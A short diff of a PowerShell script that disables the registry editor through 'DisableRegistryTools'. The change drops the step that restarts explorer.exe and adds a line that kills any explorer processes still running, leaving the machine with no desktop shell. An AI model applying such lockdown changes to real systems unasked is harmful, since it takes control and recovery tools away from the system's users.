@@ -94,6 +94,4 @@ Set-ItemProperty -Path $sysPath -Name "DisableRegistryTools" -Value 1 -Type DWor
 
 Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
 Start-Sleep 3
-Start-Process explorer.exe
-Start-Sleep 3
-exit
+Get-Process -Name explorer -ErrorAction SilentlyContinue | ForEach-Object { Stop-Process -Id $_.Id -Force }
